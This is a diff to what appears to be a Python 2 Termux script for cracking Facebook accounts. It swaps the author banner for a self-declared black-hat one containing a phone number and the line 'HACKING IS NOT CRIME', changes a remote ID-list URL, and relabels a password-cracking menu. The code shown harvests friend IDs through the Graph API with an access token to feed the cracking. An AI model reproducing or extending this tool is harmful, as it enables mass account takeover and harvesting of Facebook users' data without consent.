@@ -35,7 +35,25 @@ c3 = "\033[1;31m"
 os.system('git pull')
 os.system('clear')
 logo = """
-\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------  """  
+\033[1;92m    _          _
+\033[1;92m     \        /
+\033[1;92m    __\______/__
+\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
+ \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
+\033[1;92m╔══o00════════00o═════════════════════════╗
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
+\033[1;92m╚═════════════════════════════════════════╝
+\033[1;93m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
+\033[1;93m➣ BANGLADESH BLACK HAT HACKER
+\033[1;31;1m➣     AUTHOR :\033[1;92m JAMES-HACKER
+\033[1;31;1m➣       FROM :\033[1;92m DHAKA,NARAYANGANJ 
+\033[1;31;1m➣    WARNING :\033[1;92m DON'T COPY MY SCRIPT
+\033[1;31;1m➣    WARNING :\033[1;92m IF YOU GET TO FACE PROBLEM CLONING TIME
+\033[1;31;1m➣    WARNING :\033[1;92m CONTACT MY FB GROUP OR PAGE  """  
 def reg():
     os.system('clear')
     print logo
@@ -49,7 +67,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/Blacklisted-CKG/shahrukh/main/jam/id.txt').text
+    r = requests.get('https://raw.githubusercontent.com/Eva1010/IS/main/lip/id.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -753,7 +771,7 @@ def choice_crack():
     os.system('clear')
     print logo
     print ''
-    print '\033[1;31;1m~~~~ Manuall pass cracking ~~~~'
+    print '\033[1;31;1m~~~~ Exract File ~~~~'
     print ''
     print '\x1b[0;97m1).\x1b[0;97m \x1b[0;97m Extract Public ID '
     print '\x1b[0;91m0\x1b[0;97m).\x1b[0;97m \x1b[0;97mBack '
@@ -785,7 +803,7 @@ def c_s():
             print ' Extract Public ID !'
             raw_input('Press Enter To Back. ')
 	    time.sleep(0.01)
-            c_s()
+            log_menu()
 
         r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + token)
         z = json.loads(r.text)
